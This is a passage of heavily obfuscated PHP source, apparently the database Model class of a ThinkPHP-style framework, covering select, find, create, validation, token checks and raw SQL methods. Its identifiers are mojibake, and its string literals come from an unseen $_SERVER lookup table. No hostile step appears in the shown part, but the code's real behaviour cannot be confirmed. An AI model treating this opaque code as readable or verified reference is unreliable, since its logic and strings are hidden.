È¼“[304]][$Ê‘ö¨…Ê])) { $ş²âÑİ© = $‡Ä×²·¥[$Ôº È¼“[304]][$Ê‘ö¨…Ê]; } $Š‡˜åá¦ = $this->db->delete($‡Ä×²·¥); if (!1 !== $Š‡˜åá¦) { $ÛßÉúüÅ = array(); if (isset($ş²âÑİ©)) { $ÛßÉúüÅ[$Ê‘ö¨…Ê] = $ş²âÑİ©; } $this->_after_delete($ÛßÉúüÅ, $‡Ä×²·¥); } return $Š‡˜åá¦; } protected function _after_delete($Éë€Ô, $Øä—‘) { } public function select($ÃÁ‰æ² = array()) { $›ŒÛ¤¯© =& $_SERVER[¡“ËÌ§œ]; if (is_string($ÃÁ‰æ²) || is_numeric($ÃÁ‰æ²)) { $•†”—¯È = $this->getPk(); if (strpos($ÃÁ‰æ², $›ŒÛ¤¯©[50])) { $Ÿë¤ñÜâ[$•†”—¯È] = array($›ŒÛ¤¯©[305], $ÃÁ‰æ²); } else { $Ÿë¤ñÜâ[$•†”—¯È] = $ÃÁ‰æ²; } $this->options[$›ŒÛ¤¯©[304]] = $Ÿë¤ñÜâ; } elseif (!1 === $ÃÁ‰æ²) { $ÃÁ‰æ² = $this->_parseOptions(); return $›ŒÛ¤¯©[306] . $this->db->buildSelectSql($ÃÁ‰æ²) . $›ŒÛ¤¯©[307]; } $ÃÁ‰æ² = $this->_parseOptions(); $ñ³ˆ×½° = $this->db->select($ÃÁ‰æ²); if (!1 === $ñ³ˆ×½°) { return !1; } if (empty($ñ³ˆ×½°)) { return null; } $this->_afterSelect($ñ³ˆ×½°, $ÃÁ‰æ²); return $ñ³ˆ×½°; } protected function _afterSelect(&$šÑµæˆ‹, $Ü«´ ¹‹) { } public function buildSql($Ñ»ËÚÉ = array()) { $„ËØ“Ø =& $_SERVER[¡“ËÌ§œ]; $Ñ»ËÚÉ = $this->_parseOptions($Ñ»ËÚÉ); return $„ËØ“Ø[306] . $this->db->buildSelectSql($Ñ»ËÚÉ) . $„ËØ“Ø[307]; } public function optionsValue($œˆ¢•ÔÛ = null) { if (is_null($œˆ¢•ÔÛ)) { return $this->options; } elseif (is_array($œˆ¢•ÔÛ)) { $this->options = array_merge($this->options, $œˆ¢•ÔÛ); } } protected function _parseOptions($—°ô‡ÙÜ = array()) { $úÏØ‡‰² =& $_SERVER[¡“ËÌ§œ]; if (is_array($—°ô‡ÙÜ)) { $—°ô‡ÙÜ = array_merge($this->options, $—°ô‡ÙÜ); } $this->options = array(); if (!isset($—°ô‡ÙÜ[$úÏØ‡‰²[308]])) { $—°ô‡ÙÜ[$úÏØ‡‰²[308]] = $this->getTableName(); $ÂË”ÏúÅ = $this->fields; } else { $ÂË”ÏúÅ = $this->getDbFields(); } if (!empty($—°ô‡ÙÜ[$úÏØ‡‰²[309]])) { $—°ô‡ÙÜ[$úÏØ‡‰²[308]] .= $úÏØ‡‰²[53] . $—°ô‡ÙÜ[$úÏØ‡‰²[309]]; } $—°ô‡ÙÜ[$úÏØ‡‰²[310]] = $this->name; if (isset($—°ô‡ÙÜ[$úÏØ‡‰²[304]]) && is_array($—°ô‡ÙÜ[$úÏØ‡‰²[304]]) && !empty($ÂË”ÏúÅ) && !isset($—°ô‡ÙÜ[$úÏØ‡‰²[311]]) && !isset($—°ô‡ÙÜ[$úÏØ‡‰²[308]])) { foreach ($—°ô‡ÙÜ[$úÏØ‡‰²[304]] as $‘øÒ”·¿ => $à¶ŒÇ¢Ô) { $‘øÒ”·¿ = trim($‘øÒ”·¿); if (in_array($‘øÒ”·¿, $ÂË”ÏúÅ, !0)) { if (is_scalar($à¶ŒÇ¢Ô)) { $this->_parseType($—°ô‡ÙÜ[$úÏØ‡‰²[304]], $‘øÒ”·¿); } } elseif (!is_numeric($‘øÒ”·¿) && $úÏØ‡‰²[11] != substr($‘øÒ”·¿, 0, 1) && !1 === strpos($‘øÒ”·¿, $úÏØ‡‰²[10]) && !1 === strpos($‘øÒ”·¿, $úÏØ‡‰²[289]) && !1 === strpos($‘øÒ”·¿, $úÏØ‡‰²[312]) && !1 === strpos($‘øÒ”·¿, $úÏØ‡‰²[313])) { unset($—°ô‡ÙÜ[$úÏØ‡‰²[304]][$‘øÒ”·¿]); } } } $this->_options_filter($—°ô‡ÙÜ); return $—°ô‡ÙÜ; } protected function _options_filter(&$şÇıê®Å) { } protected function _parseType(&$ë¸ä‘—Ñ, $ˆáòØ±º) { $úäó®†Ì =& $_SERVER[¡“ËÌ§œ]; if (empty($this->options[$úäó®†Ì[314]][$úäó®†Ì[4] . $ˆáòØ±º])) { $ìÃÜÛÁ = strtolower($this->fields[$úäó®†Ì[281]][$ˆáòØ±º]); if (!1 !== strpos($ìÃÜÛÁ, $úäó®†Ì[315])) { } elseif (!1 === strpos($ìÃÜÛÁ, $úäó®†Ì[316]) && !1 !== strpos($ìÃÜÛÁ, $úäó®†Ì[317])) { $ë¸ä‘—Ñ[$ˆáòØ±º] = intval($ë¸ä‘—Ñ[$ˆáòØ±º]); } elseif (!1 !== strpos($ìÃÜÛÁ, $úäó®†Ì[318]) || !1 !== strpos($ìÃÜÛÁ, $úäó®†Ì[319])) { $ë¸ä‘—Ñ[$ˆáòØ±º] = floatval($ë¸ä‘—Ñ[$ˆáòØ±º]); } elseif (!1 !== strpos($ìÃÜÛÁ, $úäó®†Ì[320])) { $ë¸ä‘—Ñ[$ˆáòØ±º] = (bool) $ë¸ä‘—Ñ[$ˆáòØ±º]; } } } public function find($îºÇˆ·û = array()) { $•ªâ»ŞÈ =& $_SERVER[¡“ËÌ§œ]; if (is_numeric($îºÇˆ·û) || is_string($îºÇˆ·û)) { $Ğ…˜ÎõÍ[$this->getPk()] = intval($îºÇˆ·û); $this->options[$•ªâ»ŞÈ[304]] = $Ğ…˜ÎõÍ; } $this->options[$•ªâ»ŞÈ[321]] = 1; $îºÇˆ·û = $this->_parseOptions(); $ºí‚†ş = $this->db->select($îºÇˆ·û); if (!1 === $ºí‚†ş) { return !1; } if (empty($ºí‚†ş)) { return null; } $this->data = $ºí‚†ş[0]; $this->_afterFind($this->data, $îºÇˆ·û); if (!empty($this->options[$•ªâ»ŞÈ[322]])) { return $this->returnResult($this->data, $this->options[$•ªâ»ŞÈ[322]]); } return $this->data; } protected function _afterFind(&$£¶ˆ³—, $æƒÓš²) { } protected function returnResult($ì¶’¾³œ, $›¯…Ó©× = '') { $ñŒÖıÜã =& $_SERVER[¡“ËÌ§œ]; if ($›¯…Ó©×) { if (is_callable($›¯…Ó©×)) { return call_user_func($›¯…Ó©×, $ì¶’¾³œ); } switch (strtolower($›¯…Ó©×)) { case $ñŒÖıÜã[323]: return json_encode($ì¶’¾³œ); case $ñŒÖıÜã[324]: return xml_encode($ì¶’¾³œ); } } return $ì¶’¾³œ; } public function parseFieldsMap($ˆÛä€ñœ, $ãúÜƒ¶‚ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ößé¥ğ => $ï‰ú½˜¨) { if ($ãúÜƒ¶‚ == 1) { if (isset($ˆÛä€ñœ[$ï‰ú½˜¨])) { $ˆÛä€ñœ[$ößé¥ğ] = $ˆÛä€ñœ[$ï‰ú½˜¨]; unset($ˆÛä€ñœ[$ï‰ú½˜¨]); } } else { if (isset($ˆÛä€ñœ[$ößé¥ğ])) { $ˆÛä€ñœ[$ï‰ú½˜¨] = $ˆÛä€ñœ[$ößé¥ğ]; unset($ˆÛä€ñœ[$ößé¥ğ]); } } } } return $ˆÛä€ñœ; } public function setField($’Úù†°ì, $äğ·ÁÓá = '') { if (is_array($’Úù†°ì)) { $ß’œğ…¶ = $’Úù†°ì; } else { $ß’œğ…¶[$’Úù†°ì] = $äğ·ÁÓá; } return $this->save($ß’œğ…¶); } public function setAdd($¼®ÌûÚö, $³›­Ğ ï = 1) { $ª¯ßèâ =& $_SERVER[¡“ËÌ§œ]; $™ÍŞåı = $¼®ÌûÚö . $ª¯ßèâ[325] . $³›­Ğ ï; if ($³›­Ğ ï < 0) { $™ÍŞåı = $¼®ÌûÚö . $³›­Ğ ï; } return $this->setField($¼®ÌûÚö, array($ª¯ßèâ[326], $™ÍŞåı)); } public function getField($‹Í§¢Õ¹, $ĞˆÏ›Ø° = null) { $›°Ó’Ì =& $_SERVER[¡“ËÌ§œ]; $ªÏú‹¡Ã[$›°Ó’Ì[302]] = $‹Í§¢Õ¹; $ªÏú‹¡Ã = $this->_parseOptions($ªÏú‹¡Ã); $‹Í§¢Õ¹ = trim($‹Í§¢Õ¹); if (strpos($‹Í§¢Õ¹, $›°Ó’Ì[50])) { if (!isset($ªÏú‹¡Ã[$›°Ó’Ì[321]])) { $ªÏú‹¡Ã[$›°Ó’Ì[321]] = is_numeric($ĞˆÏ›Ø°) ? $ĞˆÏ›Ø° : $›°Ó’Ì[12]; } $ï÷ª«õ‘ = $this->db->select($ªÏú‹¡Ã); if (!empty($ï÷ª«õ‘)) { $É‘êŠç = explode($›°Ó’Ì[50], $‹Í§¢Õ¹); $‹Í§¢Õ¹ = array_keys($ï÷ª«õ‘[0]); $ó‘€ŞŒ = array_shift($‹Í§¢Õ¹); $‰óú½£Ü = array_shift($‹Í§¢Õ¹); $•¿®‰û = array(); $³£ä‰öä = count($É‘êŠç); foreach ($ï÷ª«õ‘ as $¿¼ÜÒ÷Ş) { $ùÑÊÔ­œ = $¿¼ÜÒ÷Ş[$ó‘€ŞŒ]; if (2 == $³£ä‰öä) { $•¿®‰û[$ùÑÊÔ­œ] = $¿¼ÜÒ÷Ş[$‰óú½£Ü]; } else { $•¿®‰û[$ùÑÊÔ­œ] = is_string($ĞˆÏ›Ø°) ? implode($ĞˆÏ›Ø°, $¿¼ÜÒ÷Ş) : $¿¼ÜÒ÷Ş; } } return $•¿®‰û; } } else { if (!0 !== $ĞˆÏ›Ø°) { $ªÏú‹¡Ã[$›°Ó’Ì[321]] = is_numeric($ĞˆÏ›Ø°) ? $ĞˆÏ›Ø° : 1; } if ($ĞˆÏ›Ø° === $›°Ó’Ì[284]) { unset($ªÏú‹¡Ã[$›°Ó’Ì[321]]); } $¿¼ÜÒ÷Ş = $this->db->select($ªÏú‹¡Ã); if (!empty($¿¼ÜÒ÷Ş)) { if ($ĞˆÏ›Ø° === $›°Ó’Ì[284]) { return reset($¿¼ÜÒ÷Ş[0]); } if (!0 !== $ĞˆÏ›Ø° && 1 == $ªÏú‹¡Ã[$›°Ó’Ì[321]]) { return reset($¿¼ÜÒ÷Ş[0]); } foreach ($¿¼ÜÒ÷Ş as $İ½…òÌ) { $¨ŸÃ‘Ã[] = $İ½…òÌ[$‹Í§¢Õ¹]; } return $¨ŸÃ‘Ã; } } return null; } public function create($‡ãŞŒ³Ú = '', $Î¶³Šå© = '') { $²¶±Íà² =& $_SERVER[¡“ËÌ§œ]; if (empty($‡ãŞŒ³Ú)) { $‡ãŞŒ³Ú = $_POST; } elseif (is_object($‡ãŞŒ³Ú)) { $‡ãŞŒ³Ú = get_object_vars($‡ãŞŒ³Ú); } if (empty($‡ãŞŒ³Ú) || !is_array($‡ãŞŒ³Ú)) { $this->error = think_lang($²¶±Íà²[300]); return !1; } $‡ãŞŒ³Ú = $this->parseFieldsMap($‡ãŞŒ³Ú, 0); $Î¶³Šå© = $Î¶³Šå© ? $Î¶³Šå© : (!empty($‡ãŞŒ³Ú[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$²¶±Íà²[302]])) { $›†ùÚïı = $this->options[$²¶±Íà²[302]]; unset($this->options[$²¶±Íà²[302]]); } elseif ($Î¶³Šå© == THINK_MODEL_INSERT && isset($this->insertFields)) { $›†ùÚïı = $this->insertFields; } elseif ($Î¶³Šå© == THINK_MODEL_UPDATE && isset($this->updateFields)) { $›†ùÚïı = $this->updateFields; } if (isset($›†ùÚïı)) { if (is_string($›†ùÚïı)) { $›†ùÚïı = explode($²¶±Íà²[50], $›†ùÚïı); } if (think_config($²¶±Íà²[327])) { $›†ùÚïı[] = think_config($²¶±Íà²[328]); } foreach ($‡ãŞŒ³Ú as $³ ‡¬ÌÏ => $½Ô„·) { if (!in_array($³ ‡¬ÌÏ, $›†ùÚïı)) { unset($‡ãŞŒ³Ú[$³ ‡¬ÌÏ]); } } } if (!$this->autoValidation($‡ãŞŒ³Ú, $Î¶³Šå©)) { return !1; } if (!$this->autoCheckToken($‡ãŞŒ³Ú)) { $this->error = think_lang($²¶±Íà²[329]); return !1; } if ($this->autoCheckFields) { $›†ùÚïı = $this->getDbFields(); foreach ($‡ãŞŒ³Ú as $³ ‡¬ÌÏ => $½Ô„·) { if (!in_array($³ ‡¬ÌÏ, $›†ùÚïı)) { unset($‡ãŞŒ³Ú[$³ ‡¬ÌÏ]); } elseif (MAGIC_QUOTES_GPC && is_string($½Ô„·)) { $‡ãŞŒ³Ú[$³ ‡¬ÌÏ] = stripslashes($½Ô„·); } } } $this->autoOperation($‡ãŞŒ³Ú, $Î¶³Šå©); $this->data = $‡ãŞŒ³Ú; return $‡ãŞŒ³Ú; } public function autoCheckToken($Ìî¨°†í) { $‚áÈÂ¯ =& $_SERVER[¡“ËÌ§œ]; if (isset($this->options[$‚áÈÂ¯[330]]) && !$this->options[$‚áÈÂ¯[330]]) { return !0; } if (think_config($‚áÈÂ¯[327])) { $¼¸¿¥§Û = think_config($‚áÈÂ¯[328]); if (!isset($Ìî¨°†í[$¼¸¿¥§Û]) || Session::get($¼¸¿¥§Û)) { return !1; } list($¾ãÅ¿Â×, $³ò¥‡«) = explode($‚áÈÂ¯[11], $Ìî¨°†í[$¼¸¿¥§Û]); if ($³ò¥‡« && Session::get($¼¸¿¥§Û . $‚áÈÂ¯[10] . $¾ãÅ¿Â×) === $³ò¥‡«) { Session::remove($¼¸¿¥§Û . $‚áÈÂ¯[10] . $¾ãÅ¿Â×); return !0; } if (think_config($‚áÈÂ¯[331])) { Session::remove($¼¸¿¥§Û . $‚áÈÂ¯[10] . $¾ãÅ¿Â×); } return !1; } return !0; } public function regex($Ğ½Æ©ò…, $Ş«¸ÜÇ¸) { $¾ä­À§¿ =& $_SERVER[¡“ËÌ§œ]; $ìğóş´ = array($¾ä­À§¿[332] => $¾ä­À§¿[333], $¾ä­À§¿[334] => $¾ä­À§¿[335], $¾ä­À§¿[336] => $¾ä­À§¿[337], $¾ä­À§¿[338] => $¾ä­À§¿[339], $¾ä­À§¿[340] => $¾ä­À§¿[341], $¾ä­À§¿[342] => $¾ä­À§¿[343], $¾ä­À§¿[344] => $¾ä­À§¿[345], $¾ä­À§¿[319] => $¾ä­À§¿[346], $¾ä­À§¿[347] => $¾ä­À§¿[348]); if (isset($ìğóş´[strtolower($Ş«¸ÜÇ¸)])) { $Ş«¸ÜÇ¸ = $ìğóş´[strtolower($Ş«¸ÜÇ¸)]; } return preg_match($Ş«¸ÜÇ¸, $Ğ½Æ©ò…) === 1; } private function autoOperation(&$ùâÀÚÅ», $Ğ€ˆšÙª) { $»‚¤ãğ =& $_SERVER[¡“ËÌ§œ]; if (!empty($this->options[$»‚¤ãğ[349]])) { $å«ãÓ—á = $this->options[$»‚¤ãğ[349]]; unset($this->options[$»‚¤ãğ[349]]); } elseif (!empty($this->_auto)) { $å«ãÓ—á = $this->_auto; } if (isset($å«ãÓ—á)) { foreach ($å«ãÓ—á as $«£¦‰›ë) { if (empty($«£¦‰›ë[2])) { $«£¦‰›ë[2] = THINK_MODEL_INSERT; } if ($Ğ€ˆšÙª == $«£¦‰›ë[2] || $«£¦‰›ë[2] == THINK_MODEL_BOTH) { switch (trim($«£¦‰›ë[3])) { case $»‚¤ãğ[350]: case $»‚¤ãğ[351]: $ ªë¡ï½ = isset($«£¦‰›ë[4]) ? (array) $«£¦‰›ë[4] : array(); if (isset($ùâÀÚÅ»[$«£¦‰›ë[0]])) { array_unshift($ ªë¡ï½, $ùâÀÚÅ»[$«£¦‰›ë[0]]); } if ($»‚¤ãğ[350] == $«£¦‰›ë[3]) { $ùâÀÚÅ»[$«£¦‰›ë[0]] = call_user_func_array($«£¦‰›ë[1], $ ªë¡ï½); } else { $ùâÀÚÅ»[$«£¦‰›ë[0]] = call_user_func_array(array(&$this, $«£¦‰›ë[1]), $ ªë¡ï½); } break; case $»‚¤ãğ[302]: $ùâÀÚÅ»[$«£¦‰›ë[0]] = $ùâÀÚÅ»[$«£¦‰›ë[1]]; break; case $»‚¤ãğ[352]: if ($»‚¤ãğ[12] === $ùâÀÚÅ»[$«£¦‰›ë[0]]) { unset($ùâÀÚÅ»[$«£¦‰›ë[0]]); } break; case $»‚¤ãğ[353]: default: $ùâÀÚÅ»[$«£¦‰›ë[0]] = $«£¦‰›ë[1]; } if (!1 === $ùâÀÚÅ»[$«£¦‰›ë[0]]) { unset($ùâÀÚÅ»[$«£¦‰›ë[0]]); } } } } return $ùâÀÚÅ»; } protected function autoValidation($á¦»±ÍÓ, $¬â½±¡¯) { $©ìêéÉÄ =& $_SERVER[¡“ËÌ§œ]; if (!empty($this->options[$©ìêéÉÄ[354]])) { $ª¹ÃÚßÓ = $this->options[$©ìêéÉÄ[354]]; unset($this->options[$©ìêéÉÄ[354]]); } elseif (!empty($this->_validate)) { $ª¹ÃÚßÓ = $this->_validate; } if (isset($ª¹ÃÚßÓ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ª¹ÃÚßÓ as $’®²É® => $’¤‡Ï›œ) { if (empty($’¤‡Ï›œ[5]) || $’¤‡Ï›œ[5] == THINK_MODEL_BOTH || $’¤‡Ï›œ[5] == $¬â½±¡¯) { if (0 == strpos($’¤‡Ï›œ[2], $©ìêéÉÄ[355]) && strpos($’¤‡Ï›œ[2], $©ìêéÉÄ[356])) { $’¤‡Ï›œ[2] = think_lang(substr($’¤‡Ï›œ[2], 2, -1)); } $’¤‡Ï›œ[3] = isset($’¤‡Ï›œ[3]) ? $’¤‡Ï›œ[3] : THINK_EXISTS_VALIDATE; $’¤‡Ï›œ[4] = isset($’¤‡Ï›œ[4]) ? $’¤‡Ï›œ[4] : $©ìêéÉÄ[357]; switch ($’¤‡Ï›œ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($á¦»±ÍÓ, $’¤‡Ï›œ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($©ìêéÉÄ[12] != trim($á¦»±ÍÓ[$’¤‡Ï›œ[0]])) { if (!1 === $this->_validationField($á¦»±ÍÓ, $’¤‡Ï›œ)) { return !1; } } break; default: if (isset($á¦»±ÍÓ[$’¤‡Ï›œ[0]])) { if (!1 === $this->_validationField($á¦»±ÍÓ, $’¤‡Ï›œ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Òğ­²‰ö, $—İü‹ş) { if (!1 === $this->_validationFieldItem($Òğ­²‰ö, $—İü‹ş)) { if ($this->patchValidate) { $this->error[$—İü‹ş[0]] = $—İü‹ş[2]; } else { $this->error = $—İü‹ş[2]; return !1; } } return; } protected function _validationFieldItem($®ÚÆéôæ, $’©å¾Ôå) { $÷Ìší¬Ï =& $_SERVER[¡“ËÌ§œ]; switch (strtolower(trim($’©å¾Ôå[4]))) { case $÷Ìší¬Ï[350]: case $÷Ìší¬Ï[351]: $ŒÍ„µµ = isset($’©å¾Ôå[6]) ? (array) $’©å¾Ôå[6] : array(); if (is_string($’©å¾Ôå[0]) && strpos($’©å¾Ôå[0], $÷Ìší¬Ï[50])) { $’©å¾Ôå[0] = explode($÷Ìší¬Ï[50], $’©å¾Ôå[0]); } if (is_array($’©å¾Ôå[0])) { foreach ($’©å¾Ôå[0] as $£™ŞÖ“Ô) { $·šÎä[$£™ŞÖ“Ô] = $®ÚÆéôæ[$£™ŞÖ“Ô]; } array_unshift($ŒÍ„µµ, $·šÎä); } else { array_unshift($ŒÍ„µµ, $®ÚÆéôæ[$’©å¾Ôå[0]]); } if ($÷Ìší¬Ï[350] == $’©å¾Ôå[4]) { return call_user_func_array($’©å¾Ôå[1], $ŒÍ„µµ); } else { return call_user_func_array(array(&$this, $’©å¾Ôå[1]), $ŒÍ„µµ); } case $÷Ìší¬Ï[358]: return $®ÚÆéôæ[$’©å¾Ôå[0]] == $®ÚÆéôæ[$’©å¾Ôå[1]]; case $÷Ìší¬Ï[359]: if (is_string($’©å¾Ôå[0]) && strpos($’©å¾Ôå[0], $÷Ìší¬Ï[50])) { $’©å¾Ôå[0] = explode($÷Ìší¬Ï[50], $’©å¾Ôå[0]); } $ó€Ã±ôÌ = array(); if (is_array($’©å¾Ôå[0])) { foreach ($’©å¾Ôå[0] as $£™ŞÖ“Ô) { $ó€Ã±ôÌ[$£™ŞÖ“Ô] = $®ÚÆéôæ[$£™ŞÖ“Ô]; } } else { $ó€Ã±ôÌ[$’©å¾Ôå[0]] = $®ÚÆéôæ[$’©å¾Ôå[0]]; } if (!empty($®ÚÆéôæ[$this->getPk()])) { $ó€Ã±ôÌ[$this->getPk()] = array($÷Ìší¬Ï[360], $®ÚÆéôæ[$this->getPk()]); } if ($this->where($ó€Ã±ôÌ)->find()) { return !1; } return !0; default: return $this->check($®ÚÆéôæ[$’©å¾Ôå[0]], $’©å¾Ôå[1], $’©å¾Ôå[4]); } } public function check($›‹—ô‰Ù, $ºëÅ’Ê, $ ÷£ù• = "\x72\145\147\145\170") { $ìÏş‹ˆ— =& $_SERVER[¡“ËÌ§œ]; $ ÷£ù• = strtolower(trim($ ÷£ù•)); switch ($ ÷£ù•) { case $ìÏş‹ˆ—[7]: case $ìÏş‹ˆ—[361]: $µ¥½„ß– = is_array($ºëÅ’Ê) ? $ºëÅ’Ê : explode($ìÏş‹ˆ—[50], $ºëÅ’Ê); return $ ÷£ù• == $ìÏş‹ˆ—[7] ? in_array($›‹—ô‰Ù, $µ¥½„ß–) : !in_array($›‹—ô‰Ù, $µ¥½„ß–); case $ìÏş‹ˆ—[362]: case $ìÏş‹ˆ—[363]: if (is_array($ºëÅ’Ê)) { $ÈÍ¹½ì“ = $ºëÅ’Ê[0]; $•ıÑ“¾ = $ºëÅ’Ê[1]; } else { list($ÈÍ¹½ì“, $•ıÑ“¾) = explode($ìÏş‹ˆ—[50], $ºëÅ’Ê); } return $ ÷£ù• == $ìÏş‹ˆ—[362] ? $›‹—ô‰Ù >= $ÈÍ¹½ì“ && $›‹—ô‰Ù <= $•ıÑ“¾ : $›‹—ô‰Ù < $ÈÍ¹½ì“ || $›‹—ô‰Ù > $•ıÑ“¾; case $ìÏş‹ˆ—[364]: case $ìÏş‹ˆ—[365]: return $ ÷£ù• == $ìÏş‹ˆ—[364] ? $›‹—ô‰Ù == $ºëÅ’Ê : $›‹—ô‰Ù != $ºëÅ’Ê; case $ìÏş‹ˆ—[366]: $•ïŸ¹“ğ = mb_strlen($›‹—ô‰Ù, $ìÏş‹ˆ—[367]); if (strpos($ºëÅ’Ê, $ìÏş‹ˆ—[50])) { list($ÈÍ¹½ì“, $•ıÑ“¾) = explode($ìÏş‹ˆ—[50], $ºëÅ’Ê); return $•ïŸ¹“ğ >= $ÈÍ¹½ì“ && $•ïŸ¹“ğ <= $•ıÑ“¾; } else { return $•ïŸ¹“ğ == $ºëÅ’Ê; } case $ìÏş‹ˆ—[368]: list($‰ÌŒš–³, $„Ï•ØŠÃ) = explode($ìÏş‹ˆ—[50], $ºëÅ’Ê); if (!is_numeric($‰ÌŒš–³)) { $‰ÌŒš–³ = strtotime($‰ÌŒš–³); } if (!is_numeric($„Ï•ØŠÃ)) { $„Ï•ØŠÃ = strtotime($„Ï•ØŠÃ); } return NOW_TIME >= $‰ÌŒš–³ && NOW_TIME <= $„Ï•ØŠÃ; case $ìÏş‹ˆ—[369]: return in_array(get_client_ip(), explode($ìÏş‹ˆ—[50], $ºëÅ’Ê)); case $ìÏş‹ˆ—[370]: return !in_array(get_client_ip(), explode($ìÏş‹ˆ—[50], $ºëÅ’Ê)); case $ìÏş‹ˆ—[357]: default: return $this->regex($›‹—ô‰Ù, $ºëÅ’Ê); } } public function query($É¬ƒËº, $Ãõã“› = false) { $™¸—øƒ‚ =& $_SERVER[¡“ËÌ§œ]; if (!is_bool($Ãõã“›) && !is_array($Ãõã“›)) { $Ãõã“› = func_get_args(); array_shift($Ãõã“›); } $É¬ƒËº = str_replace(array($™¸—øƒ‚[231], $™¸—øƒ‚[371]), $™¸—øƒ‚[53], $É¬ƒËº); $É¬ƒËº = $this->parseSql($É¬ƒËº, $Ãõã“›); return $this->db->query($É¬ƒËº); } public function execute($ÃäÙ»ëù, $¡°À™î­ = false) { if (!is_bool($¡°À™î­) && !is_array($¡°À™î­)) { $¡°À™î­ = func_get_args(); array_shift($¡°À™î­); } $ÃäÙ»ëù = $this->parseSql($ÃäÙ»ëù, $¡°À™î­); return $this->db->execute($ÃäÙ»ëù); } protected function parseSql($îŸ‰³¥ñ, $¦©ÓÜÈá) { $À©«³‡ë =& $_SERVER[¡“ËÌ§œ]; if (!0 === $¦©ÓÜÈá) { $ÙÊú¥İÁ = $this->_parseOptions(); $îŸ‰³¥ñ = $this->db->parseSql($îŸ‰³¥ñ, $ÙÊú¥İÁ); } elseif (is_array($¦©ÓÜÈá)) { $¦©ÓÜÈá = array_map(array($this->db, $À©«³‡ë[372]), $¦©ÓÜÈá); $îŸ‰³¥ñ = vsprintf($îŸ‰³¥ñ, $¦©ÓÜÈá); } else { $îŸ‰³¥ñ = strtr($îŸ‰³¥ñ, array($À©«³‡ë[373] => $this->getTableName(), $À©«³‡ë[374] => think_config($À©«³‡ë[273]))); } $this->db->setModel($this->name); return $îŸ‰³¥ñ; } public function db($¤´äâ¿ò = '', $×ßıô€š = '', $ù”¥€« = array()) { $ºàÜñ§Ç =& $_SERVER[¡“ËÌ§œ]; if ($ºàÜñ§Ç[12] === $¤´äâ¿ò && $this->db) { return $this->db; } static $›°ÎÍ‘ = array(); static $í™€ï³Ô = array(); if (!isset($í™€ï³Ô[$¤´äâ¿ò]) || isset($í™€ï³Ô[$¤´äâ¿ò]) && $×ßıô€š && $›°ÎÍ‘[$¤´äâ¿ò] != $×ßıô€š) { if (!empty($×ßıô€š) && is_string($×ßıô€š) && !1 === strpos($×ßıô€š, $ºàÜñ§Ç[8])) { $×ßıô€š = think_config($×ßıô€š); } $¤´äâ¿ò = think_guid($×ßıô€š); $í™€ï³Ô[$¤´äâ¿ò] = Db::getInstance($×ßıô€š); } elseif (NULL === $×ßıô€š) { $í™€ï³Ô[$¤´äâ¿ò]->close(); unset($í™€ï³Ô[$¤´äâ¿ò]); return; } if (!empty($ù”¥€«)) { if (is_string($ù”¥€«)) { parse_str($ù”¥€«, $ù”¥€«); } foreach ($ù”¥€« as $‘»¡Õş« => $´±ãÙ³º) { $this->setProperty($‘»¡Õş«, $´±ãÙ³º); } } $›°ÎÍ‘[$¤´äâ¿ò] = $×ßıô€š; $this->db = $í™€ï³Ô[$¤´äâ¿ò]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $œé†èä² = get_class($this); if ($œé†èä² == $_SERVER[¡“ËÌ§œ][375]) { return $this->name; } $this->name = substr($œé†èä², 0, -5); } return $this->name; } public function getTableName() { $ø¥åâË¢ =& $_SERVER[¡“ËÌ§œ]; if (empty($this->trueTableName)) { $‚€²Ò€Å = !empty($this->tablePrefix) ? $this->tablePrefix : $ø¥åâË¢[12]; if (!empty($this->tableName)) { $‚€²Ò€Å .= $this->tableName; } else { $‚€²Ò€Å .= think_parse_name($this->name); } $this->trueTableName = strtolower($‚€²Ò€Å); } return (!empty($this->dbName) ? $this->dbName . $ø¥åâË¢[10] : $ø¥åâË¢[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ê”Ó‹şŞ =& $_SERVER[¡“ËÌ§œ]; return isset($this->fields[$ê”Ó‹şŞ[280]]) ? $this->fields[$ê”Ó‹şŞ[280]] : $this->pk; } public function getDbFields() { $â‡¿³úÍ =& $_SERVER[¡“ËÌ§œ]; if (isset($this->options[$â‡¿³úÍ[308]])) { $”ãÖ·×° = $this->db->getFields($this->options[$â‡¿³úÍ[308]]); return $”ãÖ·×° ? array_keys($”ãÖ·×°) : !1; } if ($this->fields) { $”ãÖ·×° = $this->fields; unset($”ãÖ·×°[$â‡¿³úÍ[279]], $”ãÖ·×°[$â‡¿³úÍ[280]], $”ãÖ·×°[$â‡¿³úÍ[281]], $”ãÖ·×°[$â‡¿³úÍ[278]]); return $”ãÖ·×°; } return !1; } public function data($ÃâŠï™¾ = '') { $¶™ÖÂ±á =& $_SERVER[¡“ËÌ§œ]; if ($¶™ÖÂ±á[12] === $ÃâŠï™¾ && !empty($this->data)) { return $this->data; } if (is_object($ÃâŠï™¾)) { $ÃâŠï™¾ = get_object_vars($ÃâŠï™¾); } elseif (is_string($ÃâŠï™¾)) { parse_str($ÃâŠï™¾, $ÃâŠï™¾); } elseif (!is_array($ÃâŠï™¾)) { think_exception(think_lang($¶™ÖÂ±á[300])); } $this->data = $ÃâŠï™¾; return $this; } public function join($Åî×”š) { $ªÁ±ãÃ =& $_SERVER[¡“ËÌ§œ]; if (is_array($Åî×”š)) { $this->options[$ªÁ±ãÃ[311]] = $Åî×”š; } elseif (!empty($Åî×”š)) { $this->options[$ªÁ±ãÃ[311]][] = $Åî×”š; } return $this; } public function union($‘©œª¸œ, $İà®Œ°¿ = false) { $‰­î‡Õ =& $_SERVER[¡“ËÌ§œ]; if (empty($‘©œª¸œ)) { return $this; } if ($İà®Œ°¿) { 